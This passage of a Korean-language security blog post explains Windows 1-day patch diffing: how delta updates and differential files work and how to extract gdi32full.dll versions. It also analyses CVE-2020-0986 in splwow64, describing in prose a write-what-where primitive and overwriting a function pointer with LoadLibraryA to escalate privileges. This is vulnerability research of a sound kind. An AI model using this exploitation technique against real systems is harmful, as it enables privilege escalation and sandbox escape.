&#xB192;&#xC8E0;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled.png" alt="Untitled"></p><p>&#xC774;&#xB7F4; &#xB550; Windows&#xC758; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xC6D0;&#xD558;&#xB294; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xAD6C;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/12-1.png" alt="12-1.png"></p><p>Windows&#xB294; &#xBAA8;&#xB4E0; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD30C;&#xC77C;&#xC774; Microsoft Update &#xCE74;&#xD0C8;&#xB85C;&#xADF8;&#xC5D0; &#xC5C5;&#xB85C;&#xB4DC;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBE4C;&#xB4DC;&#xC640; &#xB9B4;&#xB9AC;&#xC988; &#xB0A0;&#xC9DC; &#xC815;&#xBCF4;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD328;&#xCE58;&#xB41C; &#xB0A0;&#xC9DC;&#xC640; &#xD658;&#xACBD;&#xC5D0; &#xB9DE;&#xB294; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC8E0;. &#xC774;&#xB7EC;&#xD55C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD328;&#xD0A4;&#xC9C0;&#xB85C; &#xC6D0;&#xD558;&#xB294; &#xBC84;&#xC804;&#xC758; &#xBD84;&#xC11D;&#xD560; &#xD30C;&#xC77C;&#xC744; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/13-1.png" alt="13-1.png"></p><p>&#xD328;&#xCE58;&#xB97C; &#xC801;&#xC6A9;&#xD574;&#xC11C; &#xC6D0;&#xD558;&#xB294; &#xBC84;&#xC804;&#xC758; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; Windows&#xC758; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xBC29;&#xC2DD;&#xC5D0; &#xB300;&#xD574; &#xBA3C;&#xC800; &#xC774;&#xD574;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. Windows&#xB294; &#xB378;&#xD0C0; &#xD328;&#xCE58; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xB294;&#xB370;, &#xB378;&#xD0C0; &#xD328;&#xCE58;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xD2B9;&#xC9D5;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD328;&#xD0A4;&#xC9C0;&#xC5D0;&#xB294; &#xC644;&#xC804;&#xD55C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xAC00; &#xC544;&#xB2CC; &#xBCC0;&#xACBD;&#xB41C; &#xCF54;&#xB4DC;&#xB9CC; &#xC788;&#xB294; differential &#xD30C;&#xC77C;&#xB9CC; &#xC874;&#xC7AC;</li><li>&#xAE30;&#xBCF8; &#xBC84;&#xC804;&#xC758; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xB450;&#xACE0; &#xBCC0;&#xACBD;&#xB41C; &#xB0B4;&#xC6A9;&#xB9CC;&#xC744; &#xB2F4;&#xACE0; &#xC788;&#xB294; differnetial &#xD30C;&#xC77C;&#xC744; &#xAE30;&#xBCF8; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xC801;&#xC6A9;&#xD558;&#xBA74; &#xD574;&#xB2F9; &#xD328;&#xCE58; &#xBC84;&#xC804;&#xC73C;&#xB85C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB418;&#xB294; &#xBC29;&#xC2DD;</li><li>&#xB864;&#xBC31;&#xACFC; &#xD328;&#xCE58;&#xB294; &#xBC18;&#xB4DC;&#xC2DC; &#xAE30;&#xBCF8; &#xBC84;&#xC804;&#xC744; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9D0;<ul><li>&#xADF8;&#xB9BC;&#xC744; &#xBCF4;&#xBA74; &#xAE30;&#xBCF8; &#xBC84;&#xC804;&#xC778; 1 &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xBC84;&#xC804; 2 &#xB610;&#xB294; &#xBC84;&#xC804; 3&#xC73C;&#xB85C; &#xB378;&#xD0C0; &#xD328;&#xCE58;&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xC9C0;&#xB9CC; &#xBC84;&#xC804; 2&#xC640; &#xBC84;&#xC804; 3 &#xC0AC;&#xC774;&#xC5D0;&#xB294; &#xBD88;&#xAC00;&#xB2A5;</li></ul></li></ul><p>&#xC774;&#xB7EC;&#xD55C; &#xB378;&#xD0C0; &#xD328;&#xCE58; &#xBC29;&#xBC95;&#xC740; &#xB864;&#xBC31; &#xB4F1; &#xAD00;&#xB9AC;&#xAC00; &#xBE44;&#xAD50;&#xC801; &#xC6A9;&#xC774;&#xD558;&#xBA70;  &#xBC84;&#xC804; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD30C;&#xC77C;&#xC758; &#xD06C;&#xAE30;&#xB3C4; &#xC904;&#xC5B4; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC2DC; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC0AC;&#xC6A9;&#xB7C9;&#xC744; &#xC808;&#xC57D;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/14-1.png" alt="14-1.png"></p><p>MS&#xC758; PatchAPI &#xACF5;&#xC2DD; &#xBB38;&#xC11C;&#xC5D0; &#xC124;&#xBA85;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xB378;&#xD0C0; &#xD328;&#xCE58; &#xACFC;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; &#xD30C;&#xC77C; F&#xC640; F<code>&#xC73C;&#xB85C; Delta Compression Create &#xACFC;&#xC815;&#xC744; &#xAC70;&#xCCD0; differential &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xC0DD;&#xC131;&#xB41C; differential &#xD30C;&#xC77C;&#xC740; F</code> &#xD504;&#xB77C;&#xC784; &#xD30C;&#xC77C;&#xC740; &#xBB3C;&#xB860; &#xC774;&#xB97C; &#xC555;&#xCD95;&#xD55C; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xD6E8;&#xC52C; &#xC791;&#xC544; &#xD6A8;&#xC728;&#xC801;&#xC774;&#xBA70; &#xB378;&#xD0C0; &#xD328;&#xCE58;&#xC758; &#xC7A5;&#xC810;&#xC774;&#xB77C;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. F<code>&#xD30C;&#xC77C;&#xC744; &#xB2E4;&#xC2DC; &#xC5BB;&#xACE0;&#xC790; &#xD560; &#xB54C;&#xB294; F &#xD30C;&#xC77C;&#xACFC; differential &#xD30C;&#xC77C;&#xC744; &#xC774;&#xC6A9;&#xD574; Delta Compression Apply &#xACFC;&#xC815;&#xC744; &#xAC70;&#xCCD0;&#xC11C; F</code> &#xD30C;&#xC77C;&#xC744; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/15-1.png" alt="15-1.png"></p><p>&#xBD84;&#xC11D;&#xD560; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xAD6C;&#xD560; &#xBC29;&#xBC95;&#xC744; &#xC54C;&#xC544;&#xB0C8;&#xC73C;&#xB2C8; Windows&#xC758; &#xD504;&#xB9B0;&#xD130; &#xAE30;&#xB2A5;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810; CVE-2020-0986&#xACFC; &#xC774;&#xC5D0; &#xB300;&#xD55C; &#xD328;&#xCE58; &#xC6B0;&#xD68C;&#xC778; CVE-2021-1648&#xC744; &#xC608;&#xC2DC;&#xB97C; &#xB4E4;&#xC5B4; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6B0;&#xC120; &#xD328;&#xCE58; &#xD788;&#xC2A4;&#xD1A0;&#xB9AC;&#xBD80;&#xD130; &#xC870;&#xC0AC;&#xD574;&#xC57C; &#xD558;&#xACA0;&#xC8E0;. CVE-2020-0986&#xC740; &#xC81C;&#xBCF4;&#xB41C; &#xC774;&#xD6C4; 2020&#xB144; 6&#xC6D4; &#xC2DC;&#xD050;&#xB9AC;&#xD2F0; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xD1B5;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC644;&#xD654;&#xD558;&#xB294; &#xAC80;&#xC99D; &#xD568;&#xC218;&#xB97C; &#xCD94;&#xAC00;&#xD588;&#xC9C0;&#xB9CC;, &#xCD94;&#xAC00;&#xB41C; &#xD568;&#xC218;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; CVE-2021-1648&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xACE0; &#xC774;&#xD6C4; 2021&#xB144; 1&#xC6D4;&#xC5D0; &#xD328;&#xCE58;&#xB85C; &#xC774;&#xB7EC;&#xD55C; bypass &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD328;&#xCE58;&#xAC00; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%201.png" alt="Untitled"></p><p>CVE-2020-0986&#xC744; &#xBA3C;&#xC800; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. CVE-2020-0986&#xC740; &#xD504;&#xB9B0;&#xD130; &#xC2A4;&#xD480;&#xB7EC; API&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAD8C;&#xD55C;&#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; splwow64 &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; 32bit &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; 64bit &#xD504;&#xB9B0;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xAD6C;&#xD604;&#xB41C; &#xB808;&#xAC70;&#xC2DC; LPC(Local Procedure Call) &#xC11C;&#xBC84;&#xB85C; 32bit process&#xAC00; &#xD504;&#xB9B0;&#xD130; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC2F6;&#xC73C;&#xBA74; splwow64 &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; LPC &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0B4;&#xACE0;, splwow64 &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xC774; LPC &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xD504;&#xB9B0;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%202.png" alt="Untitled"></p><p>32bit &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xD504;&#xB9B0;&#xD130; &#xC791;&#xC5C5;&#xC744; &#xC694;&#xCCAD;&#xD558;&#xBA74; splwow64&#xB294; &#xC218;&#xC2E0;&#xD55C; LPC &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; <code>TLPC::ProcessRequest</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. <code>TLPC::ProcessRequest</code>&#xB294; &#xC218;&#xC2E0;&#xD55C; LPC &#xBA54;&#xC2DC;&#xC9C0; &#xC911; &#xBE68;&#xAC04;&#xC0C9; &#xBC15;&#xC2A4;&#xC758; printer&#xC5D0; &#xB300;&#xD55C; opcode&#xC758; &#xC720;&#xD6A8;&#xC131;&#xC744; &#xAC80;&#xC99D;&#xD558;&#xACE0; <code>gdi32full.dll</code>&#xC758; <code>GdiPrinterThunk</code> &#xD568;&#xC218;&#xB85C; &#xC804;&#xB2EC;&#xD55C; &#xB4A4; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%203.png" alt="Untitled"></p><p><code>Gdi32full.dll</code>&#xC758; <code>GdiPrinterThunk</code>&#xB294; &#xC804;&#xB2EC;&#xBC1B;&#xC740; LPC&#xC5D0; &#xD3EC;&#xD568;&#xB41C; &#xC635;&#xCF54;&#xB4DC;&#xC5D0; &#xB530;&#xB77C; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294;&#xB370;, &#xC77C;&#xBC18;&#xC801;&#xC778; 0~103&#xAE4C;&#xC9C0;&#xC758; &#xC635;&#xCF54;&#xB4DC;&#xAC00; &#xC788;&#xACE0; <code>gdi32full.dll</code> &#xB0B4;&#xBD80;&#xC5D0; &#xD2B9;&#xC218;&#xD55C; &#xC635;&#xCF54;&#xB4DC;&#xB4E4;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC911; <code>6d</code> &#xC635;&#xCF54;&#xB4DC;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; <code>INDEX_DocumentEvent</code> &#xB8E8;&#xD2F4;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; <code>RtlDecodePointer</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xC804;&#xC5ED; &#xBCC0;&#xC218; <code>fpDocumentEvent</code>&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130; &#xAC12;&#xC744; &#xB514;&#xCF54;&#xB529;&#xD574; &#xC2E4;&#xD589;&#xD55C; &#xB4A4; <code>memcpy</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294;&#xB370; &#xC774;&#xB54C; <code>memcpy</code>&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB294; LPC &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0B8; &#xC720;&#xC800; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xBAA8;&#xB450; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC5B4; <code>write-what-where</code> &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574; <code>fpDocumentEvent</code> &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130; &#xAC12;&#xC744; <code>LoadLibraryA</code>&#xB85C; &#xC218;&#xC815;&#xD558;&#xBA74; &#xC6D0;&#xD558;&#xB294; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB807;&#xAC8C; &#xB418;&#xBA74; splwow64&#xC758; &#xAD8C;&#xD55C;&#xC778; medium integrity&#xB85C; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xAD8C;&#xD55C;&#xC0C1;&#xC2B9; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Internet Explorer&#xC758; &#xACBD;&#xC6B0; splwow64&#xAC00; &#xD654;&#xC774;&#xD2B8;&#xB9AC;&#xC2A4;&#xD2B8;&#xC5D0; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD574; &#xB0AE;&#xC740; &#xAD8C;&#xD55C;&#xC758; &#xB80C;&#xB354;&#xB9C1; &#xC5D4;&#xC9C4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xAD8C;&#xD55C;&#xC744; medium integrity&#xB85C; &#xB192;&#xC77C; &#xC218; &#xC788;&#xACE0; Internet Explorer&#xC758; &#xBE0C;&#xB77C;&#xC6B0;&#xC800; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC774;&#xC2A4;&#xCF00;&#xC774;&#xD504;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%204.png" alt="Untitled"></p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xD328;&#xCE58;&#xB294; 2020&#xB144; 6&#xC6D4;&#xC5D0; &#xB9B4;&#xB9AC;&#xC988; &#xB418;&#xC5C8;&#xC73C;&#xBA70; &#xC774;&#xB7F0; &#xD328;&#xCE58; &#xC815;&#xBCF4;&#xB294; MS&#xC758; Security Response Center(MSRC)&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%205.png" alt="Untitled"></p><p>&#xD328;&#xCE58; &#xB9B4;&#xB9AC;&#xC988; &#xB0A0;&#xC9DC;&#xC640; &#xAC19;&#xC740; &#xC815;&#xBCF4;&#xB97C; &#xC218;&#xC9D1;&#xD588;&#xC73C;&#xBA74; &#xD574;&#xB2F9; &#xB0A0;&#xC9DC;&#xC758; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xAD6C;&#xD574;&#xC57C;&#xACA0;&#xC8E0;. &#xC81C; Windows &#xD658;&#xACBD;&#xC740; 2004 &#xBE4C;&#xB4DC;&#xB2C8;&#xAE4C; MS&#xC758; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xCE74;&#xD0C8;&#xB85C;&#xADF8;&#xC5D0;&#xC11C; 2020&#xB144; 6&#xC6D4; x64 2004 &#xB204;&#xC801; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xAC80;&#xC0C9;&#xD574; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%206.png" alt="Untitled"></p><p>&#xC774;&#xC81C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD55C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD328;&#xD0A4;&#xC9C0;&#xC5D0;&#xC11C; &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xCD94;&#xCD9C;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370;, <code>expand</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; msu &#xD30C;&#xC77C;&#xC5D0;&#xC11C; Windows archive&#xC778; cab&#xD30C;&#xC77C;&#xC744; &#xCD94;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%207.png" alt="Untitled"></p><p>cab&#xD30C;&#xC77C;&#xC744; &#xD55C;&#xBC88; &#xB354; &#xCD94;&#xCD9C;&#xD558;&#xBA74; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD30C;&#xC77C;&#xB4E4;&#xC774; &#xCD94;&#xCD9C;&#xB418;&#xB294;&#xB370;&#xC694; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD328;&#xD0A4;&#xC9C0; &#xD06C;&#xAE30;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB974;&#xC9C0;&#xB9CC; &#xD3C9;&#xADE0; 10&#xBD84;&#xC5D0;&#xC11C; 20&#xBD84; &#xC815;&#xB3C4; &#xAC78;&#xB9BD;&#xB2C8;&#xB2E4;. &#xCD94;&#xCD9C;&#xB41C; &#xD30C;&#xC77C;&#xC740; &#xC57D; 12000&#xAC1C; &#xC815;&#xB3C4; &#xB418;&#xB124;&#xC694;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%208.png" alt="Untitled"></p><p>tree &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xCD94;&#xCD9C;&#xD55C; &#xD30C;&#xC77C;&#xB4E4;&#xC5D0; &#xB300;&#xD574; &#xC880; &#xB354; &#xC790;&#xC138;&#xD788; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. gdi32full.dll&#xC744; &#xAC80;&#xC0C9;&#xD558;&#xBA74; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB294;&#xB370;, &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD328;&#xD0A4;&#xC9C0;&#xC758; <code>gdi32full.dll</code> &#xBC84;&#xC804;&#xC740; 10.0.19041.329&#xB85C; &#xD3F4;&#xB354; &#xC774;&#xB984;&#xC774;&#xB098; &#xD328;&#xCE58; &#xC815;&#xBCF4;&#xAC00; &#xC788;&#xB294; manifest &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs sql">10.0.19041 &#xAE4C;&#xC9C0;&#xB294; Windows &#xBE4C;&#xB4DC; &#xBC84;&#xC804;&#xC774;&#xBBC0;&#xB85C; &#xAC19;&#xC740; Windows &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xD574; &#xC0DD;&#xB7B5;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</code></pre><p>329 &#xBC84;&#xC804;&#xC758; &#xD558;&#xC704; &#xD3F4;&#xB354;&#xC5D0; f&#xC640; r &#xD3F4;&#xB354;&#xAC00; &#xC788;&#xACE0;, &#xAC01;&#xAC01;&#xC5D0; <code>gdi32full.dll</code>&#xC774; &#xC788;&#xB124;&#xC694;.</p><ul><li>f - forward differential &#xD30C;&#xC77C;&#xB85C; &#xAE30;&#xBCF8; &#xBC84;&#xC804;&#xC758; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xBA85;&#xC2DC;&#xB41C; &#xBC84;&#xC804;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;</li><li>r - reverse differential &#xD30C;&#xC77C;&#xB85C; &#xBA85;&#xC2DC;&#xB41C; &#xBC84;&#xC804;&#xACFC; &#xB3D9;&#xC77C;&#xD55C; &#xBC84;&#xC804;&#xC758; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xAE30;&#xBCF8; &#xBC84;&#xC804;&#xC73C;&#xB85C; &#xB418;&#xB3CC;&#xB9B4; &#xB54C;, &#xB2E4;&#xC2DC; &#xB9D0;&#xD574; &#xB864;&#xBC31;&#xD560; &#xC0AC;&#xC6A9;</li><li>n - null differential &#xD30C;&#xC77C;&#xB85C; &#xBCC0;&#xACBD;&#xD560; &#xD30C;&#xC77C;&#xC774; &#xC544;&#xB2CC; &#xD574;&#xB2F9; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xC5D0;&#xC11C; &#xC0C8;&#xB85C; &#xCD94;&#xAC00;&#xB420; &#xD30C;&#xC77C;&#xC774;&#xB77C;&#xB294; &#xC758;&#xBBF8;&#xC774;&#xBA70; &#xBCC0;&#xACBD;&#xD560; &#xC6D0;&#xBCF8; &#xD30C;&#xC77C;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xB2C8; &#xCD94;&#xAC00;&#xB420; &#xD30C;&#xC77C;&#xC758; &#xC6D0;&#xBCF8;&#xC774; &#xC874;&#xC7AC;</li></ul><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%209.png" alt="Untitled"></p><p>&#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD30C;&#xC77C;&#xC758; &#xBC84;&#xC804;&#xC744; &#xC54C;&#xC544;&#xBD24;&#xC73C;&#xB2C8; &#xB514;&#xD551; &#xBD84;&#xC11D;&#xD560; &#xD604;&#xC81C; &#xC81C; Windows &#xC2DC;&#xC2A4;&#xD15C;&#xC758; <code>gdi32full.dll</code> &#xBC84;&#xC804;&#xB3C4; &#xC54C;&#xC544;&#xBD10;&#xC57C;&#xACA0;&#xC8E0;. &#xD604;&#xC7AC; WIndows&#xC758; <code>gdi32full.dll</code> &#xBC84;&#xC804;&#xC740; 264&#xB85C;, CVE-2020-0986 &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xBC84;&#xC804;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC0AC;&#xC2E4; &#xD655;&#xC2E4;&#xD558;&#xAC8C; &#xD558;&#xB824;&#xBA74; 329 &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC9C1;&#xC804;&#xC758; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD328;&#xD0A4;&#xC9C0; &#xCD94;&#xCD9C;&#xC744; &#xD1B5;&#xD574; &#xB530;&#xB85C; &#xAD6C;&#xD574;&#xC57C; &#xD558;&#xC9C0;&#xB9CC; &#xC81C; Windows&#xC758; <code>gdi32full.dll</code>&#xAC00; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xBC84;&#xC804;&#xC774;&#xAE30;&#xB3C4; &#xD558;&#xACE0; 329&#xC640; &#xD06C;&#xAC8C; &#xBC84;&#xC804; &#xCC28;&#xC774;&#xAC00; &#xB098;&#xC9C0; &#xC54A;&#xC544; &#xC624;&#xB298;&#xC740; &#xC774; 264 &#xBC84;&#xC804;&#xACFC; &#xD328;&#xCE58;&#xD55C; 329 &#xBC84;&#xC804;&#xC758; <code>gdi32full.dll</code>&#xC744; Diffing &#xBD84;&#xC11D;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. <del>&#xB0A0;&#xBA39;</del></p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%2010.png" alt="Untitled"></p><p>&#xCD94;&#xCD9C;&#xD55C; forward&#xC640; reverse differential&#xC744; &#xC801;&#xC6A9;&#xD558;&#xB294; &#xD328;&#xCE58; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB294; &#xADF8;&#xB9BC;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC81C; Windows &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xB294; 264 &#xBC84;&#xC804;&#xC744; &#xAC19;&#xC740; 264 &#xBC84;&#xC804;&#xC758; reverse differential &#xD30C;&#xC77C;&#xB85C; &#xB378;&#xD0C0; &#xD328;&#xCE58;&#xD574; &#xAE30;&#xBCF8; 1 &#xBC84;&#xC804;&#xC758; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD328;&#xD0A4;&#xC9C0;&#xC5D0;&#xC11C; &#xCD94;&#xCD9C;&#xD55C; forward differential &#xD30C;&#xC77C;&#xB85C; &#xB2E4;&#xC2DC; &#xB378;&#xD0C0; 